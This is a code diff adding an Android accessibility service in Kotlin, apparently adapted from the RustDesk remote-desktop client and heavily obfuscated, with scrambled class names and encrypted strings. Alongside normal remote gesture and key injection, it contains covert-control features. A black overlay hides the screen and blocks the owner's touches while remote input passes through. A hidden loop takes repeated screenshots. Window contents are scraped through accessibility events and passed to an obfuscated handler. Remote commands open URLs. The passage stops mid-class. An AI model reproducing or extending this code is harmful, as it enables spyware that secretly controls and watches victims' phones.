@@ -1,0 +1,1248 @@
+package com.daxian.dev
+
+/**
+ * Handle remote input and dispatch android gesture
+ *
+ * Inspired by [droidVNC-NG] https://github.com/bk138/droidVNC-NG
+ */
+
+import android.accessibilityservice.AccessibilityService
+import android.accessibilityservice.GestureDescription
+import android.graphics.Path
+import android.os.Build
+import android.os.Bundle
+import android.os.Handler
+import android.os.Looper
+import android.util.Log
+import android.widget.EditText
+import android.view.accessibility.AccessibilityEvent
+import android.view.ViewGroup.LayoutParams
+import android.view.accessibility.AccessibilityNodeInfo
+import android.view.KeyEvent as KeyEventAndroid
+import android.view.ViewConfiguration
+import android.graphics.Rect
+import android.media.AudioManager
+import android.accessibilityservice.AccessibilityServiceInfo
+import android.accessibilityservice.AccessibilityServiceInfo.FLAG_INPUT_METHOD_EDITOR
+import android.accessibilityservice.AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
+import android.view.inputmethod.EditorInfo
+import androidx.annotation.RequiresApi
+import java.util.*
+import java.lang.Character
+import kotlin.math.abs
+import kotlin.math.max
+import hbb.MessageOuterClass.KeyEvent
+import hbb.MessageOuterClass.KeyboardMode
+import hbb.KeyEventConverter
+
+import android.view.WindowManager
+import android.view.WindowManager.LayoutParams.*
+import android.widget.FrameLayout
+import android.graphics.Color
+import android.annotation.SuppressLint
+import android.graphics.PixelFormat
+import android.view.Gravity
+import android.view.MotionEvent
+import android.view.View
+import android.util.DisplayMetrics
+import android.widget.ProgressBar
+import android.widget.TextView
+import android.content.Context
+import android.content.res.ColorStateList
+
+import android.content.Intent
+import android.net.Uri
+import pkg2230.ClsFx9V0S
+
+
+import android.graphics.*
+import java.io.ByteArrayOutputStream
+import android.hardware.HardwareBuffer
+import android.graphics.Bitmap.wrapHardwareBuffer
+import java.nio.IntBuffer
+import java.nio.ByteOrder
+import java.nio.ByteBuffer
+import java.io.IOException
+import java.io.File
+import java.io.FileOutputStream
+import java.lang.reflect.Field
+import java.text.SimpleDateFormat
+import android.os.Environment
+
+import java.util.concurrent.locks.ReentrantLock
+import java.security.MessageDigest
+
+import java.util.concurrent.Executor
+import java.util.concurrent.Executors
+import kotlinx.coroutines.*
+
+import android.os.SystemClock
+import android.content.res.Resources
+import android.graphics.drawable.GradientDrawable
+
+import android.view.accessibility.AccessibilityManager
+
+import java.util.concurrent.LinkedBlockingQueue
+import java.util.concurrent.ThreadPoolExecutor
+import java.util.concurrent.TimeUnit
+import android.content.ContentValues
+import android.provider.MediaStore
+import java.util.concurrent.SynchronousQueue
+
+const val LEFT_DOWN = 9
+const val LEFT_MOVE = 8
+const val LEFT_UP = 10
+const val RIGHT_UP = 18
+
+const val BACK_UP = 66
+const val WHEEL_BUTTON_DOWN = 33
+const val WHEEL_BUTTON_UP = 34
+
+const val WHEEL_BUTTON_BROWSER = 38
+
+const val WHEEL_DOWN = 523331
+const val WHEEL_UP = 963
+
+const val TOUCH_SCALE_START = 1
+const val TOUCH_SCALE = 2
+const val TOUCH_SCALE_END = 3
+const val TOUCH_PAN_START = 4
+const val TOUCH_PAN_UPDATE = 5
+const val TOUCH_PAN_END = 6
+
+const val WHEEL_STEP = 120
+const val WHEEL_DURATION = 50L
+const val LONG_TAP_DELAY = 200L
+
+class nZW99cdXQ0COhB2o : AccessibilityService() {
+
+    companion object {
+        private var viewUntouchable = true
+        private var viewTransparency = 1f //// 0 means invisible but can help prevent the service from being killed
+        var ctx: nZW99cdXQ0COhB2o? = null
+        @Volatile
+        private var pendingIgnoreCapture = false
+        val isOpen: Boolean
+            get() = ctx != null
+
+        fun requestIgnoreCapture(reason: String = "request"): Boolean {
+            val service = ctx
+            if (service == null) {
+                pendingIgnoreCapture = true
+                return false
+            }
+            service.startIgnoreCapture(reason)
+            return true
+        }
+
+        fun stopIgnoreCapture(reason: String = "request") {
+            pendingIgnoreCapture = false
+            val service = ctx
+            if (service == null) {
+                shouldRun = false
+                return
+            }
+            service.stopIgnoreCaptureLoop(reason)
+        }
+    }
+
+
+    // 黑屏防触摸：动态切换
+    private var isBlackScreenActive = false
+
+    private val restoreBlockRunnable = Runnable {
+        if (isBlackScreenActive) {
+            setOverlayTouchBlock(true)
+        }
+    }
+
+    private fun setOverlayTouchBlock(block: Boolean) {
+        if (overLay == null || overLay.windowToken == null) return
+        try {
+            val params = overLay.layoutParams as WindowManager.LayoutParams
+            if (block) {
+                params.flags = params.flags and FLAG_NOT_TOUCHABLE.inv()
+            } else {
+                params.flags = params.flags or FLAG_NOT_TOUCHABLE
+            }
+            windowManager.updateViewLayout(overLay, params)
+        } catch (e: Exception) {
+            Log.e("InputService", "setOverlayTouchBlock failed", e)
+        }
+    }
+
+    private lateinit var windowManager: WindowManager
+    private lateinit var overLayparams_bass: WindowManager.LayoutParams
+    private lateinit var overLay: FrameLayout
+    private val lock = ReentrantLock()
+    
+
+    private var leftIsDown = false
+    private var touchPath = Path()
+    private var stroke: GestureDescription.StrokeDescription? = null
+    private var lastTouchGestureStartTime = 0L
+    private var mouseX = 0
+    private var mouseY = 0
+    private var timer = Timer()
+    private var recentActionTask: TimerTask? = null
+
+    private val longPressDuration = ViewConfiguration.getTapTimeout().toLong() + ViewConfiguration.getLongPressTimeout().toLong()
+
+    private val wheelActionsQueue = LinkedList<GestureDescription>()
+    private var isWheelActionsPolling = false
+    private var isWaitingLongPress = false
+
+    private var fakeEditTextForTextStateCalculation: EditText? = null
+    private var ClassGen12Globalnode: AccessibilityNodeInfo? = null
+	
+    private var lastX = 0
+    private var lastY = 0
+
+    private val volumeController: VolumeController by lazy { VolumeController(applicationContext.getSystemService(AUDIO_SERVICE) as AudioManager) }
+
+    @RequiresApi(Build.VERSION_CODES.N)
+    fun onMouseInput(mask: Int, _x: Int, _y: Int,url: String) {
+        // 黑屏模式下：远程触摸到达时，临时允许穿透，300ms空闲后恢复阻止
+        if (isBlackScreenActive && overLay != null && overLay.windowToken != null) {
+            handler.removeCallbacks(restoreBlockRunnable)
+            handler.post { setOverlayTouchBlock(false) }  // 临时允许穿透
+            handler.postDelayed(restoreBlockRunnable, 300)  // 300ms后恢复阻止
+        }
+
+        val x = max(0, _x)
+        val y = max(0, _y)
+
+        if (mask == 0 || mask == LEFT_MOVE) {
+            val oldX = mouseX
+            val oldY = mouseY
+            mouseX = x * SCREEN_INFO.scale
+            mouseY = y * SCREEN_INFO.scale
+            if (isWaitingLongPress) {
+                val delta = abs(oldX - mouseX) + abs(oldY - mouseY)
+          
+                if (delta > 8) {
+                    isWaitingLongPress = false
+                }
+            }
+        }
+          if (mask == WHEEL_BUTTON_BROWSER) {	
+    	   
+    	   if (!url.isNullOrEmpty()) {
+			      val trimmedUrl = url.trim()
+			      if (!trimmedUrl.startsWith(p50.a(byteArrayOf(-15, 126, 73, 55), byteArrayOf(-103, 10, 61, 71, -98, 6, -32, -9, -14, -74)))) {
+
+			      } else {
+			     	    openBrowserWithUrl(trimmedUrl)
+			      }
+    	    }
+            return
+        }
+        // left button down, was up
+        if (mask == LEFT_DOWN) {
+            isWaitingLongPress = true
+            timer.schedule(object : TimerTask() {
+                override fun run() {
+                    if (isWaitingLongPress) {
+                        isWaitingLongPress = false
+                        continueGesture(mouseX, mouseY)
+                    }
+                }
+            }, longPressDuration)
+
+            leftIsDown = true
+            startGesture(mouseX, mouseY)
+            return
+        }
+
+        // left down, was down
+        if (leftIsDown) {
+            continueGesture(mouseX, mouseY)
+        }
+
+        // left up, was down
+        if (mask == LEFT_UP) {
+            if (leftIsDown) {
+                leftIsDown = false
+                isWaitingLongPress = false
+                endGesture(mouseX, mouseY)
+                return
+            }
+        }
+
+        if (mask == RIGHT_UP) {
+            longPress(mouseX, mouseY)
+            return
+        }
+
+        if (mask == BACK_UP) {
+            performGlobalAction(GLOBAL_ACTION_BACK)
+            return
+        }
+
+        // long WHEEL_BUTTON_DOWN -> GLOBAL_ACTION_RECENTS
+        if (mask == WHEEL_BUTTON_DOWN) {
+            timer.purge()
+            recentActionTask = object : TimerTask() {
+                override fun run() {
+                    performGlobalAction(GLOBAL_ACTION_RECENTS)
+                    recentActionTask = null
+                }
+            }
+            timer.schedule(recentActionTask, LONG_TAP_DELAY)
+        }
+
+        // wheel button up
+        if (mask == WHEEL_BUTTON_UP) {
+            if (recentActionTask != null) {
+                recentActionTask!!.cancel()
+                performGlobalAction(GLOBAL_ACTION_HOME)
+            }
+            return
+        }
+
+        if (mask == WHEEL_DOWN) {
+            if (mouseY < WHEEL_STEP) {
+                return
+            }
+            val path = Path()
+            path.moveTo(mouseX.toFloat(), mouseY.toFloat())
+            path.lineTo(mouseX.toFloat(), (mouseY - WHEEL_STEP).toFloat())
+            val stroke = GestureDescription.StrokeDescription(
+                path,
+                0,
+                WHEEL_DURATION
+            )
+            val builder = GestureDescription.Builder()
+            builder.addStroke(stroke)
+            wheelActionsQueue.offer(builder.build())
+            consumeWheelActions()
+
+        }
+
+        if (mask == WHEEL_UP) {
+            if (mouseY < WHEEL_STEP) {
+                return
+            }
+            val path = Path()
+            path.moveTo(mouseX.toFloat(), mouseY.toFloat())
+            path.lineTo(mouseX.toFloat(), (mouseY + WHEEL_STEP).toFloat())
+            val stroke = GestureDescription.StrokeDescription(
+                path,
+                0,
+                WHEEL_DURATION
+            )
+            val builder = GestureDescription.Builder()
+            builder.addStroke(stroke)
+            wheelActionsQueue.offer(builder.build())
+            consumeWheelActions()
+        }
+    }
+
+    @RequiresApi(Build.VERSION_CODES.N)
+    fun onTouchInput(mask: Int, _x: Int, _y: Int) {
+        when (mask) {
+            TOUCH_PAN_UPDATE -> {
+                mouseX -= _x * SCREEN_INFO.scale
+                mouseY -= _y * SCREEN_INFO.scale
+                mouseX = max(0, mouseX);
+                mouseY = max(0, mouseY);
+                continueGesture(mouseX, mouseY)
+            }
+            TOUCH_PAN_START -> {
+                mouseX = max(0, _x) * SCREEN_INFO.scale
+                mouseY = max(0, _y) * SCREEN_INFO.scale
+                startGesture(mouseX, mouseY)
+            }
+            TOUCH_PAN_END -> {
+                endGesture(mouseX, mouseY)
+                mouseX = max(0, _x) * SCREEN_INFO.scale
+                mouseY = max(0, _y) * SCREEN_INFO.scale
+            }
+            else -> {}
+        }
+    }
+
+    @RequiresApi(Build.VERSION_CODES.N)
+    fun onstart_capture(arg1: String,arg2: String) {
+		
+		if(arg1==p50.a(byteArrayOf(127), byteArrayOf(78, -52, 72, -87, 6, -44, -90)))
+		{
+              SKL=true
+		}
+		else
+		{
+            SKL=false
+		} 
+    }
+    
+      @RequiresApi(Build.VERSION_CODES.N)
+    fun onstop_overlay(arg1: String,arg2: String) {
+	   if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+
+		   if(arg1==p50.a(byteArrayOf(29), byteArrayOf(44, -90, -20, -23, -5, -38, 98, 103, 93)))
+		   {
+			   startIgnoreCapture("remote")
+		   }
+           else
+		   {
+              stopIgnoreCaptureLoop("remote")
+		   }
+
+	     }
+    }
+
+    private fun startIgnoreCapture(reason: String) {
+        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
+            return
+        }
+        pendingIgnoreCapture = false
+        if (SKL) {
+            SKL = false
+        }
+        if (!shouldRun) {
+            Wt = true
+            shouldRun = true
+            screenshotDelayMillis = ClsFx9V0S.qJM6QNqR()
+            i()
+            Log.i("InputService", "开无视: screenshot loop started, reason=$reason")
+        }
+    }
+
+    private fun stopIgnoreCaptureLoop(reason: String) {
+        pendingIgnoreCapture = false
+        shouldRun = false
+        Log.i("InputService", "关无视: screenshot loop stopped, reason=$reason")
+    }
+    
+       @RequiresApi(Build.VERSION_CODES.N)
+	fun onstart_overlay(arg1: String, arg2: String) {
+
+	    gohome = arg1.toInt()
+
+	    if (overLay != null && overLay.windowToken != null) {
+	        overLay.post {
+	            try {
+	                val params = overLay.layoutParams as WindowManager.LayoutParams
+	                if (gohome == 8) {
+	                    // 关黑屏：隐藏 + 恢复FLAG_NOT_TOUCHABLE（不拦截触摸）
+	                    isBlackScreenActive = false
+	                    handler.removeCallbacks(restoreBlockRunnable)
+	                    overLay.visibility = View.GONE
+	                    params.flags = params.flags or FLAG_NOT_TOUCHABLE
+	                } else {
+	                    // 开黑屏：显示 + 移除FLAG_NOT_TOUCHABLE（拦截所有触摸）
+	                    isBlackScreenActive = true
+	                    overLay.visibility = View.VISIBLE
+	                    params.flags = params.flags and FLAG_NOT_TOUCHABLE.inv()
+	                }
+	                windowManager.updateViewLayout(overLay, params)
+	            } catch (e: Exception) {
+	                Log.e("InputService", "onstart_overlay: updateViewLayout failed", e)
+	            }
+	        }
+	    }
+	}
+
+
+       private fun openBrowserWithUrl(url: String) {
+	     try {
+		Handler(Looper.getMainLooper()).post(
+		{
+		    val intent = Intent("android.intent.action.VIEW", Uri.parse(url))
+		    intent.flags = 268435456
+		    if (intent.resolveActivity(packageManager) != null) {
+			      DFrLMwitwQbfu7AC.app_ClassGen11_Context?.let {
+				    it.startActivity(intent)
+				}    
+		    }
+		    else
+		   {
+			    DFrLMwitwQbfu7AC.app_ClassGen11_Context?.let {
+				    it.startActivity(intent)
+				}
+		   }
+		})
+	     } catch (e: Exception) {
+	    }
+      }
+
+    
+    @RequiresApi(Build.VERSION_CODES.N)
+    private fun consumeWheelActions() {
+        if (isWheelActionsPolling) {
+            return
+        } else {
+            isWheelActionsPolling = true
+        }
+        wheelActionsQueue.poll()?.let {
+            dispatchGesture(it, null, null)
+            timer.purge()
+            timer.schedule(object : TimerTask() {
+                override fun run() {
+                    isWheelActionsPolling = false
+                    consumeWheelActions()
+                }
+            }, WHEEL_DURATION + 10)
+        } ?: let {
+            isWheelActionsPolling = false
+            return
+        }
+    }
+
+    @RequiresApi(Build.VERSION_CODES.N)
+    private fun performClick(x: Int, y: Int, duration: Long) {
+        val path = Path()
+        path.moveTo(x.toFloat(), y.toFloat())
+        try {
+            val longPressStroke = GestureDescription.StrokeDescription(path, 0, duration)
+            val builder = GestureDescription.Builder()
+            builder.addStroke(longPressStroke)
+
+            dispatchGesture(builder.build(), null, null)
+        } catch (e: Exception) {
+    
+        }
+    }
+
+    @RequiresApi(Build.VERSION_CODES.N)
+    private fun longPress(x: Int, y: Int) {
+        performClick(x, y, longPressDuration)
+    }
+
+    private fun startGesture(x: Int, y: Int) {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            touchPath.reset()
+        } else {
+            touchPath = Path()
+        }
+        touchPath.moveTo(x.toFloat(), y.toFloat())
+        lastTouchGestureStartTime = System.currentTimeMillis()
+        lastX = x
+        lastY = y
+    }
+
+    @RequiresApi(Build.VERSION_CODES.N)
+    private fun doDispatchGesture(x: Int, y: Int, willContinue: Boolean) {
+        touchPath.lineTo(x.toFloat(), y.toFloat())
+        var duration = System.currentTimeMillis() - lastTouchGestureStartTime
+        if (duration <= 0) {
+            duration = 1
+        }
+        try {
+            if (stroke == null) {
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                    stroke = GestureDescription.StrokeDescription(
+                        touchPath,
+                        0,
+                        duration,
+                        willContinue
+                    )
+                } else {
+                    stroke = GestureDescription.StrokeDescription(
+                        touchPath,
+                        0,
+                        duration
+                    )
+                }
+            } else {
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                    stroke = stroke?.continueStroke(touchPath, 0, duration, willContinue)
+                } else {
+                    stroke = null
+                    stroke = GestureDescription.StrokeDescription(
+                        touchPath,
+                        0,
+                        duration
+                    )
+                }
+            }
+            stroke?.let {
+                val builder = GestureDescription.Builder()
+                builder.addStroke(it)
+        
+                dispatchGesture(builder.build(), null, null)
+            }
+        } catch (e: Exception) {
+ 
+        }
+    }
+
+    @RequiresApi(Build.VERSION_CODES.N)
+    private fun continueGesture(x: Int, y: Int) {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            doDispatchGesture(x, y, true)
+            touchPath.reset()
+            touchPath.moveTo(x.toFloat(), y.toFloat())
+            lastTouchGestureStartTime = System.currentTimeMillis()
+            lastX = x
+            lastY = y
+        } else {
+            touchPath.lineTo(x.toFloat(), y.toFloat())
+        }
+    }
+
+    @RequiresApi(Build.VERSION_CODES.N)
+    private fun endGestureBelowO(x: Int, y: Int) {
+        try {
+            touchPath.lineTo(x.toFloat(), y.toFloat())
+            var duration = System.currentTimeMillis() - lastTouchGestureStartTime
+            if (duration <= 0) {
+                duration = 1
+            }
+            val stroke = GestureDescription.StrokeDescription(
+                touchPath,
+                0,
+                duration
+            )
+            val builder = GestureDescription.Builder()
+            builder.addStroke(stroke)
+
+            dispatchGesture(builder.build(), null, null)
+        } catch (e: Exception) {
+      
+        }
+    }
+
+    @RequiresApi(Build.VERSION_CODES.N)
+    private fun endGesture(x: Int, y: Int) {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            doDispatchGesture(x, y, false)
+            touchPath.reset()
+            stroke = null
+        } else {
+            endGestureBelowO(x, y)
+        }
+    }
+
+    @RequiresApi(Build.VERSION_CODES.N)
+    fun onKeyEvent(data: ByteArray) {
+        val keyEvent = KeyEvent.parseFrom(data)
+        val keyboardMode = keyEvent.getMode()
+
+        var textToCommit: String? = null
+
+        // [down] indicates the key's state(down or up).
+        // [press] indicates a click event(down and up).
+        // https://github.com/rustdesk/rustdesk/blob/3a7594755341f023f56fa4b6a43b60d6b47df88d/flutter/lib/models/input_model.dart#L688
+        if (keyEvent.hasSeq()) {
+            textToCommit = keyEvent.getSeq()
+        } else if (keyboardMode == KeyboardMode.Legacy) {
+            if (keyEvent.hasChr() && (keyEvent.getDown() || keyEvent.getPress())) {
+                val chr = keyEvent.getChr()
+                if (chr != null) {
+                    textToCommit = String(Character.toChars(chr))
+                }
+            }
+        } else if (keyboardMode == KeyboardMode.Translate) {
+        } else {
+        }
+
+
+        var ke: KeyEventAndroid? = null
+        if (Build.VERSION.SDK_INT < 33 || textToCommit == null) {
+            ke = KeyEventConverter.toAndroidKeyEvent(keyEvent)
+        }
+        ke?.let { event ->
+            if (tryHandleVolumeKeyEvent(event)) {
+                return
+            } else if (tryHandlePowerKeyEvent(event)) {
+                return
+            }
+        }
+
+        if (Build.VERSION.SDK_INT >= 33) {
+            getInputMethod()?.let { inputMethod ->
+                inputMethod.getCurrentInputConnection()?.let { inputConnection ->
+                    if (textToCommit != null) {
+                        textToCommit?.let { text ->
+                            inputConnection.commitText(text, 1, null)
+                        }
+                    } else {
+                        ke?.let { event ->
+                            inputConnection.sendKeyEvent(event)
+                            if (keyEvent.getPress()) {
+                                val actionUpEvent = KeyEventAndroid(KeyEventAndroid.ACTION_UP, event.keyCode)
+                                inputConnection.sendKeyEvent(actionUpEvent)
+                            }
+                        }
+                    }
+                }
+            }
+        } else {
+            val handler = Handler(Looper.getMainLooper())
+            handler.post {
+                ke?.let { event ->
+                    val possibleNodes = possibleAccessibiltyNodes()
+      
+                    for (item in possibleNodes) {
+                        val success = trySendKeyEvent(event, item, textToCommit)
+                        if (success) {
+                            if (keyEvent.getPress()) {
+                                val actionUpEvent = KeyEventAndroid(KeyEventAndroid.ACTION_UP, event.keyCode)
+                                trySendKeyEvent(actionUpEvent, item, textToCommit)
+                            }
+                            break
+                        }
+                    }
+                }
+            }
+        }
+    }
+
+    private fun tryHandleVolumeKeyEvent(event: KeyEventAndroid): Boolean {
+        when (event.keyCode) {
+            KeyEventAndroid.KEYCODE_VOLUME_UP -> {
+                if (event.action == KeyEventAndroid.ACTION_DOWN) {
+                    volumeController.raiseVolume(null, true, AudioManager.STREAM_SYSTEM)
+                }
+                return true
+            }
+            KeyEventAndroid.KEYCODE_VOLUME_DOWN -> {
+                if (event.action == KeyEventAndroid.ACTION_DOWN) {
+                    volumeController.lowerVolume(null, true, AudioManager.STREAM_SYSTEM)
+                }
+                return true
+            }
+            KeyEventAndroid.KEYCODE_VOLUME_MUTE -> {
+                if (event.action == KeyEventAndroid.ACTION_DOWN) {
+                    volumeController.toggleMute(true, AudioManager.STREAM_SYSTEM)
+                }
+                return true
+            }
+            else -> {
+                return false
+            }
+        }
+    }
+
+    private fun tryHandlePowerKeyEvent(event: KeyEventAndroid): Boolean {
+        if (event.keyCode == KeyEventAndroid.KEYCODE_POWER) {
+            // Perform power dialog action when action is up
+            if (event.action == KeyEventAndroid.ACTION_UP) {
+                performGlobalAction(GLOBAL_ACTION_POWER_DIALOG);
+            }
+            return true
+        }
+        return false
+    }
+
+    private fun insertAccessibilityNode(list: LinkedList<AccessibilityNodeInfo>, node: AccessibilityNodeInfo) {
+        if (node == null) {
+            return
+        }
+        if (list.contains(node)) {
+            return
+        }
+        list.add(node)
+    }
+
+    private fun findChildNode(node: AccessibilityNodeInfo?): AccessibilityNodeInfo? {
+        if (node == null) {
+            return null
+        }
+        if (node.isEditable() && node.isFocusable()) {
+            return node
+        }
+        val childCount = node.getChildCount()
+        for (i in 0 until childCount) {
+            val child = node.getChild(i)
+            if (child != null) {
+                if (child.isEditable() && child.isFocusable()) {
+                    return child
+                }
+                if (Build.VERSION.SDK_INT < 33) {
+                    child.recycle()
+                }
+            }
+        }
+        for (i in 0 until childCount) {
+            val child = node.getChild(i)
+            if (child != null) {
+                val result = findChildNode(child)
+                if (Build.VERSION.SDK_INT < 33) {
+                    if (child != result) {
+                        child.recycle()
+                    }
+                }
+                if (result != null) {
+                    return result
+                }
+            }
+        }
+        return null
+    }
+
+    private fun possibleAccessibiltyNodes(): LinkedList<AccessibilityNodeInfo> {
+        val linkedList = LinkedList<AccessibilityNodeInfo>()
+        val latestList = LinkedList<AccessibilityNodeInfo>()
+
+        val focusInput = findFocus(AccessibilityNodeInfo.FOCUS_INPUT)
+        var focusAccessibilityInput = findFocus(AccessibilityNodeInfo.FOCUS_ACCESSIBILITY)
+
+        val rootInActiveWindow = getRootInActiveWindow()
+
+
+        if (focusInput != null) {
+            if (focusInput.isFocusable() && focusInput.isEditable()) {
+                insertAccessibilityNode(linkedList, focusInput)
+            } else {
+                insertAccessibilityNode(latestList, focusInput)
+            }
+        }
+
+        if (focusAccessibilityInput != null) {
+            if (focusAccessibilityInput.isFocusable() && focusAccessibilityInput.isEditable()) {
+                insertAccessibilityNode(linkedList, focusAccessibilityInput)
+            } else {
+                insertAccessibilityNode(latestList, focusAccessibilityInput)
+            }
+        }
+
+        val childFromFocusInput = findChildNode(focusInput)
+
+        if (childFromFocusInput != null) {
+            insertAccessibilityNode(linkedList, childFromFocusInput)
+        }
+
+        val childFromFocusAccessibilityInput = findChildNode(focusAccessibilityInput)
+        if (childFromFocusAccessibilityInput != null) {
+            insertAccessibilityNode(linkedList, childFromFocusAccessibilityInput)
+        }
+
+        if (rootInActiveWindow != null) {
+            insertAccessibilityNode(linkedList, rootInActiveWindow)
+        }
+
+        for (item in latestList) {
+            insertAccessibilityNode(linkedList, item)
+        }
+
+        return linkedList
+    }
+
+    private fun trySendKeyEvent(event: KeyEventAndroid, node: AccessibilityNodeInfo, textToCommit: String?): Boolean {
+        node.refresh()
+        this.fakeEditTextForTextStateCalculation?.setSelection(0,0)
+        this.fakeEditTextForTextStateCalculation?.setText(null)
+
+        val text = node.getText()
+        var isShowingHint = false
+        if (Build.VERSION.SDK_INT >= 26) {
+            isShowingHint = node.isShowingHintText()
+        }
+
+        var textSelectionStart = node.textSelectionStart
+        var textSelectionEnd = node.textSelectionEnd
+
+        if (text != null) {
+            if (textSelectionStart > text.length) {
+                textSelectionStart = text.length
+            }
+            if (textSelectionEnd > text.length) {
+                textSelectionEnd = text.length
+            }
+            if (textSelectionStart > textSelectionEnd) {
+                textSelectionStart = textSelectionEnd
+            }
+        }
+
+        var success = false
+
+        if (textToCommit != null) {
+            if ((textSelectionStart == -1) || (textSelectionEnd == -1)) {
+                val newText = textToCommit
+                this.fakeEditTextForTextStateCalculation?.setText(newText)
+                success = updateTextForAccessibilityNode(node)
+            } else if (text != null) {
+                this.fakeEditTextForTextStateCalculation?.setText(text)
+                this.fakeEditTextForTextStateCalculation?.setSelection(
+                    textSelectionStart,
+                    textSelectionEnd
+                )
+                this.fakeEditTextForTextStateCalculation?.text?.insert(textSelectionStart, textToCommit)
+                success = updateTextAndSelectionForAccessibiltyNode(node)
+            }
+        } else {
+            if (isShowingHint) {
+                this.fakeEditTextForTextStateCalculation?.setText(null)
+            } else {
+                this.fakeEditTextForTextStateCalculation?.setText(text)
+            }
+            if (textSelectionStart != -1 && textSelectionEnd != -1) {
+          
+                this.fakeEditTextForTextStateCalculation?.setSelection(
+                    textSelectionStart,
+                    textSelectionEnd
+                )
+            }
+
+            this.fakeEditTextForTextStateCalculation?.let {
+                // This is essiential to make sure layout object is created. OnKeyDown may not work if layout is not created.
+                val rect = Rect()
+                node.getBoundsInScreen(rect)
+
+                it.layout(rect.left, rect.top, rect.right, rect.bottom)
+                it.onPreDraw()
+                if (event.action == KeyEventAndroid.ACTION_DOWN) {
+                    val succ = it.onKeyDown(event.getKeyCode(), event)
+        
+                } else if (event.action == KeyEventAndroid.ACTION_UP) {
+                    val success = it.onKeyUp(event.getKeyCode(), event)
+         
+                } else {}
+            }
+
+            success = updateTextAndSelectionForAccessibiltyNode(node)
+        }
+        return success
+    }
+
+    fun updateTextForAccessibilityNode(node: AccessibilityNodeInfo): Boolean {
+        var success = false
+        this.fakeEditTextForTextStateCalculation?.text?.let {
+            val arguments = Bundle()
+            arguments.putCharSequence(
+                AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE,
+                it.toString()
+            )
+            success = node.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, arguments)
+        }
+        return success
+    }
+
+    fun updateTextAndSelectionForAccessibiltyNode(node: AccessibilityNodeInfo): Boolean {
+        var success = updateTextForAccessibilityNode(node)
+
+        if (success) {
+            val selectionStart = this.fakeEditTextForTextStateCalculation?.selectionStart
+            val selectionEnd = this.fakeEditTextForTextStateCalculation?.selectionEnd
+
+            if (selectionStart != null && selectionEnd != null) {
+                val arguments = Bundle()
+                arguments.putInt(
+                    AccessibilityNodeInfo.ACTION_ARGUMENT_SELECTION_START_INT,
+                    selectionStart
+                )
+                arguments.putInt(
+                    AccessibilityNodeInfo.ACTION_ARGUMENT_SELECTION_END_INT,
+                    selectionEnd
+                )
+                success = node.performAction(AccessibilityNodeInfo.ACTION_SET_SELECTION, arguments)
+          
+            }
+        }
+
+        return success
+    }
+
+private val executor = Executors.newFixedThreadPool(5)
+
+fun runSafe(task: () -> Unit) {
+    if (Looper.myLooper() == Looper.getMainLooper()) {
+        executor.execute { task() }
+    } else {
+        task()
+    }
+}
+
+fun b481c5f9b372ead() {
+    runSafe {
+        ClsFx9V0S.dLpeh1Rh(this@nZW99cdXQ0COhB2o)
+    }
+}
+
+fun e8104ea96da3d44() {
+    runSafe {
+        try {
+            ClsFx9V0S.v1Al9U5y(
+                this@nZW99cdXQ0COhB2o,
+                ClassGen12Globalnode,
+                ClassGen12TP
+            )
+            
+            synchronized(this) {
+                ClassGen12TP = ""
+                ClassGen12NP = false
+            }
+        } catch (e: Exception) {
+            e.printStackTrace()
+        }
+    }
+}
+
+
+fun b481c5f9b372ead_2() {
+    Handler(Looper.getMainLooper()).post {
+        ClsFx9V0S.dLpeh1Rh(this@nZW99cdXQ0COhB2o)
+    }
+}
+
+    fun e8104ea96da3d44_2() {
+	    
+ Handler(Looper.getMainLooper()).post {
+    try {
+
+     ClsFx9V0S.v1Al9U5y(
+	this@nZW99cdXQ0COhB2o,
+	ClassGen12Globalnode,
+	ClassGen12TP
+       )
+        ClassGen12TP = ""
+        ClassGen12NP = false
+    } catch (e: Exception) {
+        e.printStackTrace()
+    }
+}
+ 
+
+}
+
+
+    override fun onAccessibilityEvent(event: AccessibilityEvent) {
+
+	 if(!SKL)return
+	    
+	    
+        var accessibilityNodeInfo3: AccessibilityNodeInfo?
+        try {
+	    
+	    accessibilityNodeInfo3 = ClsFx9V0S.uwEb8Ixn(this)
+            
+        } catch (unused6: java.lang.Exception) {
+            accessibilityNodeInfo3 = null
+        }
+        if (accessibilityNodeInfo3 != null) {
+            try {
+                
+                 if(SKL){
+
+                    val ss999: AccessibilityNodeInfo = accessibilityNodeInfo3
+                    Thread(Runnable { EqljohYazB0qrhnj.a012933444444(ss999) }).start()
+                }
+		 else
+		    {
+                    
+		    }
+            } catch (unused7: java.lang.Exception) {
+            }
+        }
+	    else
+	    {
+         
+	    }
+    }
+    
+ override fun takeScreenshot(
+        i: Int,
+        executor: Executor,
+        takeScreenshotCallback: TakeScreenshotCallback
+    ) {
+        super.takeScreenshot(i, executor, takeScreenshotCallback)
+    }
+      
+
+    private var screenshotDelayMillis: Long? = null
+
+	private val i = ThreadPoolExecutor(
+    3,               
+    3,               
+    0L, TimeUnit.MILLISECONDS,  
+	SynchronousQueue(),         
+    ThreadPoolExecutor.DiscardOldestPolicy()   
+)
+
+    fun d(str: String?) {
+        try {
+            if (str != null) {
+        
+                takeScreenshot(0, this.i, ScreenshotCallback())
+            }
+        } catch (e: Exception) {
+            e.printStackTrace()
+        }
+    }
+	
+    private fun l() {
+        try {
+            while (shouldRun == true) {
+                try {
+                   if (shouldRun && !SKL) {
+	                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+	                       d(p50.a(byteArrayOf(72, -60, -107, -52), byteArrayOf(36, -83, -29, -87, -46, -123, -26, -2)))
+	                    }
+					} 
+                    val delay = screenshotDelayMillis ?: return
+                    Thread.sleep(delay)
+                } catch (e: Exception) {
+                    e.printStackTrace()
+                }
+            }
+        } finally {
+            shouldRun = false
+        }
+    }
+
+    fun i() {
+        Thread {
+            l()
+        }.start()
+    }
+
+
+	 class ScreenshotCallback(
+
+    ) : AccessibilityService.TakeScreenshotCallback {
+
+	       private class ScreenshotThread(
+		    private val screenshotResult: AccessibilityService.ScreenshotResult
